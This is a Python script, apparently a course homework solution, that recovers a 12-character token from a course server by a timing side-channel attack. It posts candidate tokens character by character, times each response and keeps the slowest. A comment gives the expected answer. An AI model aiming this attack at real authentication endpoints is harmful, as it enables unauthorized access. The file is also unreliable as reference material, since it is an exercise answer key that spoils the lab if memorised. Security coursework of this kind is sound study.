
import json
import requests
import random
import time

all_char = '0123456789abcdefghijklmnopqrstuvwxyz'

fake = [' ' for _ in range(12)]

# right result is ['e', 'a', 'e', '8', '1', '5', 'b', 'b', '6', 'b', 'e', 'e']

# Iteratively find the solution
for pos in range(0,12):
	maxtime = 0
	maxch = ''
	for i in range(1):
		for ch in all_char:
			fake[pos] = ch
			payload = { "email": "fengyu.cai@epfl.ch", "token": "".join(fake) }
			parameters_json = json.dumps(payload)
			headers = {'Content-Type': 'application/json'}
			start = time.time()
			r = requests.post('http://com402.epfl.ch/hw5/ex2', data=parameters_json, headers=headers)
			end = time.time()
            
			if (end-start)>maxtime:
				maxtime = end-start
				maxch = ch
			print(ch,' ',end-start)
	fake[pos] = maxch
	print('=========')
	print(fake, maxtime)
	print('=========')

payload = { "email": "fengyu.cai@epfl.ch", "token": "".join(fake) }
parameters_json = json.dumps(payload)
headers = {'Content-Type': 'application/json'}
r = requests.post('http://com402.epfl.ch/hw5/ex2', data=parameters_json, headers=headers)
print(r.status_code)
print(r.text)